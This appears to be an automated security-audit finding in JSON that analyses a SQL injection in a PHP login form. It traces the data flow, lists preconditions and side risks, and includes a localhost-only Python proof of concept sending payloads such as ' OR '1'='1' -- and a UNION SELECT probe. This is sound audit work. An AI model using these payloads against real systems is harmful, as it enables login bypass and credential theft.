@@ -1,0 +1,143 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-002",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v2",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-002"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "第6行接收 POST uname/passwd，第8-9行原样赋值，第16行在同一作用域内把两者无转义地拼入 SELECT 的单引号字面量，第17行 mysql_query 立即执行，第19-27行把查询结果输出为登录成功区域；输入到危险操作的静态链路完整且未见参数化或转义。连接文件缺失只影响字符集/转义细节，不改变拼接事实。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-002-F1",
+      "vulnerability_type": "SQL注入",
+      "locations": [
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "if(isset($_POST['uname']) && isset($_POST['passwd']))"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 8,
+          "line_end": 9,
+          "quote": "$uname=$_POST['uname'];"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 25,
+          "line_end": 25,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 38,
+          "line_end": 38,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "入口：第6行判定 isset($_POST['uname']) && isset($_POST['passwd'])，两个参数由客户端完全可控。",
+        "接收：第8-9行把 $_POST['uname']、$_POST['passwd'] 直接赋给 $uname、$passwd，片段内未见 trim、类型校验、白名单或转义。",
+        "拼接：第16行在双引号字符串中把 $uname、$passwd 放入 username='$uname'、password='$passwd' 的单引号字面量位置，单引号未转义，攻击者可闭合引号重写 WHERE 条件。",
+        "执行：第17行 mysql_query($sql) 执行拼接后的语句，未使用 prepared statement，也无字符集设置或转义函数调用。",
+        "结果：第18行 mysql_fetch_array 取回首行；第19-33行 $row 为真时输出 Your Login name / Your Password 及 flag.jpg 图片，形成可解析的业务结果区域。",
+        "失败分支：第35-43行 $row 为假时第38行 print_r(mysql_error()) 输出数据库错误，可用于区分语法错误与布尔条件空行。",
+        "旁路写日志：第11-14行把 uname 与 passwd 明文追加到 result.txt，与注入判定无关，但证明输入未做任何清洗。"
+      ],
+      "principle": "SQL注入（登录表单字符串拼接型，非参数化）：SELECT 语句的 WHERE 子句用 PHP 双引号字符串拼接用户输入，用户输入位于单引号字符串字面量内部且未被转义。提交带单引号的 uname 可闭合 username='...'，再用 OR 逻辑短路整个 WHERE 条件或使用 UNION 追加结果集，从而绕过口令校验或改写返回列。",
+      "impact": "攻击者无需正确口令即可绕过登录，页面直接回显 users 表返回的 username 与 password，导致任意用户凭据泄露；UNION 形式还可读取同库其他表数据。写操作未涉及，但泄露口令足以横向扩展，属高危认证绕过。",
+      "preconditions": [
+        "顶层脚本可通过 HTTP 访问并接收 POST uname、passwd（第6行）。",
+        "include 的 ../sql-connections/sql-connect.php 提供可用的 mysql_* 连接；该文件未在包内提供，字符集与错误模式未知。",
+        "users 表存在且查询可执行，数据库账号具备 SELECT 权限。",
+        "运行环境支持已废弃的 mysql_* 扩展（PHP 7 起移除），否则第17行直接致命错误、无法进入第19行结果分支。",
+        "PHP 未开启 magic_quotes_gpc，且连接文件/全局入口未对 $_POST 做 addslashes 或 mysql_real_escape_string。"
+      ],
+      "counterexamples": [
+        "若 sql-connect.php 或前置入口对 $_POST 做了与连接字符集匹配的转义（addslashes/mysql_real_escape_string），单引号无法闭合字面量，注入不成立；该文件未提供，无法排除。",
+        "若运行于 PHP <5.4 且 magic_quotes_gpc=On 且未被移除，引号会被自动反斜杠转义，需按实际配置重新判定。",
+        "若 users 表为空或连接失败，任何输入都取不到 $row；但这只影响观察结果，不改变拼接语义。",
+        "客户端 maxlength、隐藏字段或前端校验不构成服务端防护，不能作为反例。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n\"\"\"SQLI-002 SQL injection local verification draft (NOT executed).\n\nScope: only localhost / 127.0.0.1 / ::1 authorized teaching lab.\nThe entry script path is NOT part of the audited fragment; it must be\nsupplied by the tester from the actual deployment.\n\nExample:\n  python sqli002_poc.py --base-url http://127.0.0.1:8080 --path /<entry-script>.php --valid-user <test-user> --valid-pass <test-pass>\n\"\"\"\nimport argparse\nimport http.client\nimport sys\nimport urllib.parse\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nLOGIN_MARK = \"Your Login name:\"\nPASS_MARK = \"Your Password:\"\nFLAG_IMG = \"../images/flag.jpg\"\nSLAP_IMG = \"../images/slap.jpg\"\nERROR_HINTS = (\n    \"You have an error in your SQL syntax\",\n    \"Warning: mysql\",\n    \"supplied argument is not a valid MySQL\",\n)\n\n\ndef parse_args():\n    p = argparse.ArgumentParser(description=\"SQLI-002 boolean/UNION SQLi draft\")\n    p.add_argument(\"--base-url\", required=True,\n                   help=\"lab base url, e.g. http://127.0.0.1:8080\")\n    p.add_argument(\"--path\", required=True,\n                   help=\"entry script path from the real deployment\")\n    p.add_argument(\"--valid-user\", required=True,\n                   help=\"dedicated test account for the baseline request\")\n    p.add_argument(\"--valid-pass\", required=True)\n    p.add_argument(\"--timeout\", type=float, default=10.0)\n    return p.parse_args()\n\n\ndef parse_target(base_url):\n    u = urllib.parse.urlsplit(base_url)\n    if u.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"only http/https allowed: %r\" % (base_url,))\n    if u.hostname not in ALLOWED_HOSTS:\n        raise SystemExit(\"only localhost/127.0.0.1/::1 allowed, got: %r\" % (u.hostname,))\n    return u\n\n\ndef post(base, path, data, timeout):\n    conn_cls = http.client.HTTPSConnection if base.scheme == \"https\" else http.client.HTTPConnection\n    port = base.port or (443 if base.scheme == \"https\" else 80)\n    conn = conn_cls(base.hostname, port, timeout=timeout)\n    body = urllib.parse.urlencode(data)\n    headers = {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        \"Connection\": \"close\",\n    }\n    try:\n        conn.request(\"POST\", path, body=body, headers=headers)\n        resp = conn.getresponse()\n        raw = resp.read()\n        return resp.status, raw.decode(\"utf-8\", \"replace\")\n    except (OSError, http.client.HTTPException) as exc:\n        return None, \"REQUEST_ERROR: %r\" % (exc,)\n    finally:\n        conn.close()\n\n\ndef between(text, start_mark):\n    i = text.find(start_mark)\n    if i < 0:\n        return None\n    j = i + len(start_mark)\n    end = len(text)\n    for mark in (\"<br>\", \"<br/>\", \"<br />\", \"\\n\"):\n        k = text.find(mark, j)\n        if k != -1 and k < end:\n            end = k\n    return text[j:end].strip()\n\n\ndef classify(status, body):\n    return {\n        \"status\": status,\n        \"login_name\": between(body, LOGIN_MARK),\n        \"login_pass\": between(body, PASS_MARK),\n        \"flag\": FLAG_IMG in body,\n        \"slap\": SLAP_IMG in body,\n        \"sql_error\": [h for h in ERROR_HINTS if h in body],\n        \"body_len\": len(body),\n    }\n\n\ndef main():\n    args = parse_args()\n    base = parse_target(args.base_url)\n    cases = [\n        (\"baseline_valid\", args.valid_user, args.valid_pass),\n        (\"negative_wrong_pass\", \"sqli002_probe_user\", \"sqli002_probe_pass\"),\n        (\"true_condition\", \"' OR '1'='1' -- \", \"sqli002_probe_pass\"),\n        (\"false_condition\", \"' AND '1'='2' -- \", \"sqli002_probe_pass\"),\n        (\"union_probe\", \"' UNION SELECT 'sqli002_marker','sqli002_marker' -- \",\n         \"sqli002_probe_pass\"),\n    ]\n    results = {}\n    for name, user, pwd in cases:\n        status, body = post(base, args.path, {\"uname\": user, \"passwd\": pwd}, args.timeout)\n        res = classify(status, body)\n        results[name] = res\n        print(\"[%s] status=%s login_name=%r login_pass=%r flag=%s slap=%s sql_error=%s len=%s\"\n              % (name, res[\"status\"], res[\"login_name\"], res[\"login_pass\"],\n                 res[\"flag\"], res[\"slap\"], bool(res[\"sql_error\"]), res[\"body_len\"]))\n\n    base_r = results[\"baseline_valid\"]\n    true_r = results[\"true_condition\"]\n    false_r = results[\"false_condition\"]\n    union_r = results[\"union_probe\"]\n\n    if base_r[\"login_name\"] is None and base_r[\"status\"] == 200:\n        print(\"PRECONDITION: baseline produced no parsable login region; \"\n              \"verify --valid-user/--valid-pass and --path before judging.\")\n    if true_r[\"status\"] == 200 and true_r[\"login_name\"] is not None and false_r[\"login_name\"] is None:\n        print(\"OBSERVATION: true condition yields a login region while false condition is empty.\")\n        if union_r[\"login_name\"] == \"sqli002_marker\":\n            print(\"OBSERVATION: UNION marker reflected in the login region (column count matched).\")\n    else:\n        print(\"OBSERVATION: no true/false difference observed; could be escaping, \"\n              \"column count mismatch, wrong path, or deployment differences.\")\n    print(\"NOTE: HTTP 200 or a reflected marker alone is not proof; keep raw responses as evidence.\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except KeyboardInterrupt:\n        sys.exit(130)\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅使用标准库 argparse、http.client、urllib.parse、sys",
+          "可访问的本地授权靶场（HTTP 或 HTTPS）",
+          "部署侧已存在 users 表与专用测试账号"
+        ],
+        "parameters": [
+          "--base-url：靶场基址，必须解析为 localhost/127.0.0.1/::1",
+          "--path：入口脚本路径，代码片段未给出，需按实际部署填写（人工适配点）",
+          "--valid-user / --valid-pass：专用测试账号口令，仅用于基线对照，不写入版本库",
+          "--timeout：请求超时秒数，默认 10",
+          "请求参数名固定为代码中的 uname、passwd，不新增其他表单字段"
+        ],
+        "steps": [
+          "在授权环境部署该片段并确认入口脚本路径与 users 表可用。",
+          "运行 baseline_valid：POST uname=<专用测试账号>&passwd=<专用测试口令>，确认返回页面出现 'Your Login name:' 区域。",
+          "运行 negative_wrong_pass 与 false_condition，记录二者均不出现登录结果区域，用于排除“任何输入都登录成功”的假象。",
+          "运行 true_condition：uname=' OR '1'='1' -- ，passwd=固定探测值，观察是否出现登录结果区域及返回的 username。",
+          "运行 union_probe：uname=' UNION SELECT 'sqli002_marker','sqli002_marker' -- ，若列数为 2 则应在用户名区域看到 marker；列数不符会报错，属于需人工确认的部署差异。",
+          "每条用例重复 2 次并保存原始响应头/响应体到工作包4证据目录，供工作包3核验。"
+        ],
+        "expected_observation": "1) baseline_valid 在测试账号有效时解析出非空 login_name，页面含 flag.jpg；2) negative_wrong_pass 与 false_condition 不出现 'Your Login name:' 区域，页面为 slap.jpg，可能伴随 mysql_error 文本；3) true_condition 的 WHERE 被 ' OR '1'='1' 短路后应返回 users 表首行，解析出的 login_name 非空且不等于基线测试账号（LIMIT 0,1 仅返回一行）；4) union_probe 在列数匹配（2 列）时 login_name 等于 sqli002_marker，列数不匹配时出现 SQL 语法/列数错误而非字段回显。",
+        "success_criteria": "1) 基线用例可解析出 'Your Login name:' 区域，证明观察点有效；2) 负例 wrong_pass 与 false_condition 均解析不到 login_name，证明空结果行可与命中行区分；3) true_condition 在相同 --path 与 uname/passwd 参数名下解析出非空且不同于基线的 login_name，重复 2 次一致；4) union_probe 若成功须解析到 sqli002_marker 字面量出现在登录结果区域；5) 保存每条用例的原始响应片段与解析值到证据文件，仅凭 HTTP 200、响应长度或错误文本不计为触发。",
+        "limitations": [
+          "脚本未运行，所有现象均为按代码路径推导的预期，不是实测结果。",
+          "入口脚本路径不在审计片段内，--path 未由代码给出，属人工适配缺口。",
+          "sql-connections/sql-connect.php 未提供，无法确认字符集、magic_quotes_gpc 或全局转义；若存在服务端转义，payload 需按实际字符集调整。",
+          "UNION 探测依赖 users 表恰为 2 列；列数需按实际表结构确认，列数不符时的报错不能当作注入失败或成功。",
+          "基线账号是否存在、口令是否正确未验证，基线失败属前置条件问题，不能等同于漏洞不存在。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/sqli-connect.php（sql-connections/sql-connect.php）的连接实现、字符集设置与错误模式。",
+    "db-creds.inc 与 users 表的列结构、列数与数据内容。",
+    "部署的 PHP/MySQL 版本、magic_quotes_gpc、sql_mode 及是否启用 WAF。",
+    "入口脚本在 Web 根目录下的相对路径与访问方式。"
+  ],
+  "risk_notes": [
+    "第11-14行把 uname 与 passwd 明文写入 result.txt，属凭据明文落盘，超出本次 SQL 注入范围。",
+    "第25-27行把数据库 username/password 原样 echo 进 HTML；若表内数据含标签，可能构成存储型 XSS（范围外）。",
+    "第38行 print_r(mysql_error()) 向客户端泄露数据库错误细节，便于攻击者构造注入（信息泄露，范围外）。"
+  ],
+  "quality_notes": [
+    "使用已废弃的 mysql_* 扩展，PHP 7+ 不可用，需兼容运行环境。",
+    "第4行 error_reporting(0) 与第16行的 @ 抑制连接/查询错误，掩盖失败原因。",
+    "第17行未检查 mysql_query 返回值即交给第18行 mysql_fetch_array，连接失败时会二次报错。"
+  ],
+  "limitations": [
+    "仅分析提供的单文件顶层处理片段；连接文件、用户表与部署配置未提供，属未知。",
+    "结论为静态候选，未执行任何 HTTP 请求，无实测证据，verdict 保持待验证。",
+    "若部署层存在全局转义或 WAF，实际可利用性需按该配置另行验证，不能由本片段推断所有配置。"
+  ],
+  "runtime_evidence": []
+}
